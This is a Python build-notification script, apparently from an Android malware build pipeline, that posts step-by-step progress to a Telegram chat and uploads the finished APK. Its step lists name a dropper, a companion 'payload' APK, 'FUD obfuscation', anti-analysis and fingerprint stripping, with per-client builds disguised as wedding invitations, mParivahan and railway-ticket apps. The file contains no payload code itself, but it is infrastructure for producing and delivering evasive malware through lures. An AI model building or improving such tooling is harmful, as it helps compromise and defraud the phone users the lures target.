#!/usr/bin/env python3
"""
telegram_notify.py
─────────────────────────────────────────────────────────────────────────────
Called by build_dev.yml / build.yml at every step.
Edits a single Telegram message in-place (message mutation).
On success: edits message to success state + sends APK file.
On failure: edits message to failed state.

Usage:
  python3 scripts/telegram_notify.py \
    --step       "Build companion APK" \
    --status     "progress" \
    --build      "271" \
    --template   "wedding" \
    --client     "1" \
    --chat-id    "8852912150" \
    --msg-id     "12345" \
    --token      "BOT_TOKEN" \
    --build-type "full"        # full | companion_only (default: full)
    --pkg        "com.example" # shown from step 4 onwards

  # Final success step with APK:
  python3 scripts/telegram_notify.py \
    --step       "Send to Telegram" \
    --status     "success" \
    --build      "271" \
    --template   "wedding" \
    --client     "1" \
    --chat-id    "8852912150" \
    --msg-id     "12345" \
    --token      "BOT_TOKEN" \
    --build-type "full" \
    --apk        "app/build/outputs/apk/release/nova_abc123.apk" \
    --apk-size   "2.7 MB" \
    --pkg        "com.shaadicard.invitemaker"
"""

import argparse
import json
import os
import sys
import time
import urllib.request
import urllib.parse
from datetime import datetime, timezone

# ── Full build steps (dropper + companion) ────────────────────────────────────
BUILD_STEPS_FULL = [
    ("Checkout",              "[1/9] 📥 Checkout & setup"),
    ("Install tools",         "[2/9] 🔧 Install build tools"),
    ("Generate package name", "[3/9] 🎲 Generate package name"),
    ("Inject Nova package",   "[4/9] 💉 Inject Nova package"),
    ("Build companion APK",   "[5/9] 🔨 Build companion APK"),
    ("Build release APK",     "[6/9] 🏗  Build Nova release APK"),
    ("Phase 2 obfuscation",   "[7/9] 🛡  Phase 2 — FUD obfuscation"),
    ("Re-sign APK",           "[7/9] ✍️  Re-sign APK"),
    ("Strip fingerprints",    "[8/9] 🧹 Strip fingerprints + anti-analysis"),
    ("Integrity check",       "[9/9] 🔍 Integrity check"),
    ("Send to Telegram",      "[✅]  📤 Send APK to Telegram"),
]

# ── Companion-only build steps (payload only, no Nova/dropper) ────────────────
BUILD_STEPS_COMPANION = [
    ("Checkout",              "[1/4] 📥 Checkout & setup"),
    ("Install tools",         "[2/4] 🔧 Install build tools"),
    ("Generate package name", "[3/4] 🎲 Generate package name"),
    ("Build companion APK",   "[4/4] 🔨 Build companion APK (payload)"),
    ("Send to Telegram",      "[✅]  📤 Send APK to Telegram"),
]

# ── Average step durations in seconds (for ETA) ──────────────────────────────
STEP_DURATIONS_FULL = {
    "Checkout":              15,
    "Install tools":         60,
    "Generate package name": 10,
    "Inject Nova package":   10,
    "Build companion APK":   90,
    "Build release APK":    180,
    "Phase 2 obfuscation":   30,
    "Re-sign APK":           15,
    "Strip fingerprints":    20,
    "Integrity check":       10,
    "Send to Telegram":      10,
}

STEP_DURATIONS_COMPANION = {
    "Checkout":              15,
    "Install tools":         60,
    "Generate package name": 10,
    "Build companion APK":   90,
    "Send to Telegram":      10,
}

# ── Template display names + emoji ───────────────────────────────────────────
TEMPLATE_MAP = {
    "wedding":      ("💍", "Wedding Invitation"),
    "shaadi":       ("💒", "Shaadi Ka Nimantran"),
    "shaadi_hindi": ("💒", "Shaadi Ka Nimantran"),
    "mparivahan":   ("🚗", "mParivahan"),
    "railway":      ("🚂", "Indian Railway Ticket"),
    "friends":      ("👥", "Friends Club"),
    "bhabhi":       ("😄", "Fun with Bhabhi"),
    "custom":       ("⚙️",  "Custom"),
    "companion":    ("🔧", "Companion App"),
}


def _get_step_tables(build_type: str):
    """Return (steps_list, durations_dict) for the given build_type."""
    if build_type == "companion_only":
        return BUILD_STEPS_COMPANION, STEP_DURATIONS_COMPANION
    return BUILD_STEPS_FULL, STEP_DURATIONS_FULL


def _progress_bar(pct: int, width: int = 10) -> str:
    """Return a filled progress bar string. e.g. ████████░░ 80%"""
    filled = round(width * pct / 100)
    empty  = width - filled
    bar    = "█" * filled + "░" * empty
    return f"{bar} {pct}%"


def _calc_percent(current_step_key: str, build_type: str) -> int:
    """Return 0-100 percent based on which step is currently running."""
    steps, _ = _get_step_tables(build_type)
    keys = [k for k, _ in steps]
    if current_step_key not in keys:
        return 0
    idx = keys.index(current_step_key)
    # Step i/total: when step i is running, pct = i/total*100
    return round(idx / len(keys) * 100)


def _calc_eta(current_step_key: str, elapsed: int, build_type: str) -> str:
    """Calculate remaining ETA based on current step and elapsed time."""
    steps, durations = _get_step_tables(build_type)
    keys = [k for k, _ in steps]
    found = False
    remaining = 0
    for key in keys:
        if key == current_step_key:
            found = True
            # Current step: add its remaining portion (assume half done)
            remaining += max(0, durations.get(key, 10) // 2)
            continue
        if found:
            remaining += durations.get(key, 10)
    if remaining <= 0:
        return "~0s"
    return f"~{format_elapsed(remaining)}"


def telegram_request(token: str, method: str, data: dict,
                     files: dict = None, retries: int = 3) -> dict:
    """Make Telegram API request with retry."""
    url = f"https://api.telegram.org/bot{token}/{method}"

    for attempt in range(retries):
        try:
            if files:
                import mimetypes
                boundary = "----TelegramBoundary"
                body_parts = []

                for key, value in data.items():
                    body_parts.append(
                        f"--{boundary}\r\n"
                        f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
                        f"{value}\r\n"
                    )

                for key, (filename, file_data, mime) in files.items():
                    body_parts.append(
                        f"--{boundary}\r\n"
                        f'Content-Disposition: form-data; name="{key}"; '
                        f'filename="{filename}"\r\n'
                        f"Content-Type: {mime}\r\n\r\n"
                    )

                body = "".join(body_parts).encode("utf-8")
                for key, (filename, file_data, mime) in files.items():
                    body += file_data + f"\r\n--{boundary}--\r\n".encode()

                req = urllib.request.Request(
                    url, data=body,
                    headers={"Content-Type":
                             f"multipart/form-data; boundary={boundary}"}
                )
            else:
                payload = json.dumps(data).encode("utf-8")
                req = urllib.request.Request(
                    url, data=payload,
                    headers={"Content-Type": "application/json"}
                )

            with urllib.request.urlopen(req, timeout=15) as resp:
                return json.loads(resp.read().decode("utf-8"))

        except Exception as e:
            print(f"[telegram_notify] Attempt {attempt + 1}/{retries} failed: {e}",
                  file=sys.stderr)
            if attempt < retries - 1:
                time.sleep(3)

    print(f"[telegram_notify] All {retries} attempts failed for {method}",
          file=sys.stderr)
    return {}


def send_message(token: str, chat_id: str, text: str) -> str:
    """Send new message. Returns message_id as string."""
    result = telegram_request(token, "sendMessage", {
        "chat_id":    chat_id,
        "text":       text,
        "parse_mode": "HTML",
    })
    msg = result.get("result", {})
    return str(msg.get("message_id", ""))


def edit_message(token: str, chat_id: str, message_id: str, text: str):
    """Edit existing message in-place (message mutation)."""
    if not message_id or message_id == "0":
        return
    telegram_request(token, "editMessageText", {
        "chat_id":    chat_id,
        "message_id": message_id,
        "text":       text,
        "parse_mode": "HTML",
    })


def send_document(token: str, chat_id: str, apk_path: str,
                  caption: str) -> bool:
    """Send APK file as Telegram document."""
    if not os.path.exists(apk_path):
        print(f"[telegram_notify] APK not found: {apk_path}", file=sys.stderr)
        return False

    filename = os.path.basename(apk_path)
    with open(apk_path, "rb") as f:
        file_data = f.read()

    result = telegram_request(
        token, "sendDocument",
        {
            "chat_id":    chat_id,
            "caption":    caption,
            "parse_mode": "HTML",
        },
        files={
            "document": (filename, file_data,
                         "application/vnd.android.package-archive")
        }
    )
    return bool(result.get("ok"))


def format_elapsed(seconds: int) -> str:
    """Format seconds as Xm Ys."""
    m = seconds // 60
    s = seconds % 60
    if m > 0:
        return f"{m}m {s:02d}s"
    return f"{s}s"


def build_progress_message(current_step: str, status: str,
                           build_num: str, template: str,
                           client: str, elapsed: int,
                           pkg: str = "",
                           apk_size: str = "",
                           build_type: str = "full") -> str:
    """Build the progress message text."""

    is_companion = (build_type == "companion_only")
    emoji, display_name = TEMPLATE_MAP.get(
        "companion" if is_companion else template,
        ("⚙️", template.title())
    )
    now_utc = datetime.now(timezone.utc).strftime("%H:%M:%S UTC")

    # ── Normalise step key: strip [DEV] prefix and emoji suffixes ─────────────
    step_key = current_step
    for prefix in ("[DEV] Checkout dev branch", "[DEV] Checkout"):
        if step_key.startswith(prefix):
            step_key = "Checkout"
            break
    for send_suffix in ("Send to Telegram", "Send to Telegram"):
        if send_suffix in step_key:
            step_key = "Send to Telegram"
            break

    steps, durations = _get_step_tables(build_type)
    step_keys  = [k for k, _ in steps]
    step_labels = {k: lbl for k, lbl in steps}

    # ── SUCCESS ───────────────────────────────────────────────────────────────
    if status == "success":
        bar = _progress_bar(100)
        lines = [
            f"✅ <b>Build #{build_num} — SUCCESS</b>",
            "━━━━━━━━━━━━━━━━━━━━",
            f"📦 Type     : {emoji} {display_name}",
            f"👤 Client   : {client}",
            f"🔢 Build    : #{build_num}",
            "━━━━━━━━━━━━━━━━━━━━",
            f"📊 Progress : {bar}",
            "━━━━━━━━━━━━━━━━━━━━",
        ]
        if pkg:
            lines.append(f"📦 Package  : <code>{pkg}</code>")
        if apk_size:
            lines.append(f"📁 Size     : {apk_size}")
        lines += [
            f"⏱ Duration : {format_elapsed(elapsed)}",
            f"🕐 Time     : {now_utc}",
            "━━━━━━━━━━━━━━━━━━━━",
            "APK file sent below ⬇️",
        ]
        return "\n".join(lines)

    # ── FAILURE ───────────────────────────────────────────────────────────────
    if status == "failure":
        pct = _calc_percent(step_key, build_type)
        bar = _progress_bar(pct)
        lines = [
            f"❌ <b>Build #{build_num} — FAILED</b>",
            "━━━━━━━━━━━━━━━━━━━━",
            f"📦 Type     : {emoji} {display_name}",
            f"👤 Client   : {client}",
            f"🔢 Build    : #{build_num}",
            "━━━━━━━━━━━━━━━━━━━━",
            f"📊 Progress : {bar}",
            f"⚠️ Failed at: <b>{step_labels.get(step_key, step_key)}</b>",
            "━━━━━━━━━━━━━━━━━━━━",
            f"⏱ Elapsed   : {format_elapsed(elapsed)}",
            f"🕐 Time      : {now_utc}",
            "━━━━━━━━━━━━━━━━━━━━",
            "Check GitHub Actions for full log.",
        ]
        return "\n".join(lines)

    # ── PROGRESS ──────────────────────────────────────────────────────────────
    pct = _calc_percent(step_key, build_type)
    bar = _progress_bar(pct)
    eta = _calc_eta(step_key, elapsed, build_type)

    # Render step list
    current_found = False
    step_lines = []
    for key, label in steps:
        if key == step_key:
            step_lines.append(f"⏳ <b>{label}…</b>")
            current_found = True
        elif not current_found:
            step_lines.append(f"✅ {label}")
        else:
            step_lines.append(f"⬜ {label}")

    lines = [
        f"🔨 <b>Building: {emoji} {display_name}</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        f"👤 Client  : {client}",
        f"🔢 Build   : #{build_num}",
    ]
    if pkg:
        lines.append(f"📦 Package : <code>{pkg}</code>")
    lines += [
        "━━━━━━━━━━━━━━━━━━━━",
    ]
    lines += step_lines
    lines += [
        "━━━━━━━━━━━━━━━━━━━━",
        f"📊 {bar}",
        f"⏱ Elapsed : {format_elapsed(elapsed)}",
        f"⏰ ETA     : {eta}",
        f"🕐 Time    : {now_utc}",
    ]
    return "\n".join(lines)


def resolve_token(token_arg: str) -> str:
    PLACEHOLDER = "YOUR_BOT_TOKEN_HERE"
    if token_arg and token_arg != PLACEHOLDER and ":" in token_arg:
        return token_arg
    env_token = os.environ.get("TELEGRAM_BOT_TOKEN", "")
    if env_token and env_token != PLACEHOLDER and ":" in env_token:
        return env_token
    env_token2 = os.environ.get("BOT_TOKEN", "")
    if env_token2 and env_token2 != PLACEHOLDER and ":" in env_token2:
        return env_token2
    return ""


def resolve_chat_id(chat_id_arg: str) -> str:
    if chat_id_arg and chat_id_arg not in ("0", "", "YOUR_CHAT_ID_HERE"):
        return chat_id_arg
    env_chat = os.environ.get("TELEGRAM_CHAT_ID", "")
    if env_chat and env_chat not in ("0", ""):
        return env_chat
    env_chat2 = os.environ.get("BUILD_CHAT_ID", "")
    if env_chat2 and env_chat2 not in ("0", ""):
        return env_chat2
    return ""


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--step",        required=True)
    parser.add_argument("--status",      required=True,
                        choices=["progress", "success", "failure"])
    parser.add_argument("--build",       required=True)
    parser.add_argument("--template",    required=True)
    parser.add_argument("--client",      required=True)
    parser.add_argument("--chat-id",     required=True, dest="chat_id")
    parser.add_argument("--msg-id",      required=True, dest="msg_id")
    parser.add_argument("--token",       required=True)
    parser.add_argument("--apk",         default="")
    parser.add_argument("--apk-size",    default="", dest="apk_size")
    parser.add_argument("--pkg",         default="")
    parser.add_argument("--elapsed",     default="0", type=int)
    parser.add_argument("--build-type",  default="full", dest="build_type",
                        choices=["full", "companion_only"])
    args = parser.parse_args()

    resolved_token   = resolve_token(args.token)
    resolved_chat_id = resolve_chat_id(args.chat_id)

    if not resolved_token or not resolved_chat_id:
        print("[telegram_notify] No chat_id or token — skipping notification")
        sys.exit(0)

    args.token   = resolved_token
    args.chat_id = resolved_chat_id

    # ── Elapsed: use BUILD_START_TS env var if set (more accurate) ────────────
    elapsed = args.elapsed
    start_ts = os.environ.get("BUILD_START_TS", "")
    if start_ts:
        try:
            elapsed = int(time.time()) - int(start_ts)
        except Exception:
            pass

    # ── Also accept BUILD_TYPE env var as fallback ────────────────────────────
    build_type = args.build_type
    if build_type == "full":
        env_bt = os.environ.get("BUILD_TYPE", "")
        if env_bt in ("full", "companion_only"):
            build_type = env_bt

    text = build_progress_message(
        current_step=args.step,
        status=args.status,
        build_num=args.build,
        template=args.template,
        client=args.client,
        elapsed=elapsed,
        pkg=args.pkg,
        apk_size=args.apk_size,
        build_type=build_type,
    )

    if args.msg_id and args.msg_id != "0":
        edit_message(args.token, args.chat_id, args.msg_id, text)
    else:
        print(f"[telegram_notify] No msg_id — message not edited")

    # On success: send APK file as separate message
    if args.status == "success" and args.apk:
        is_companion = (build_type == "companion_only")
        emoji, display_name = TEMPLATE_MAP.get(
            "companion" if is_companion else args.template,
            ("⚙️", args.template.title())
        )
        caption = (
            f"📦 <b>Build #{args.build} — {emoji} {display_name}</b>\n"
            f"Package : <code>{args.pkg}</code>\n"
            f"Size    : {args.apk_size}"
        )
        ok = send_document(args.token, args.chat_id, args.apk, caption)
        if ok:
            print(f"[telegram_notify] APK sent successfully")
        else:
            print(f"[telegram_notify] APK send failed", file=sys.stderr)
            sys.exit(1)

    print(f"[telegram_notify] Done — step={args.step} status={args.status} "
          f"build_type={build_type}")


if __name__ == "__main__":
    main()
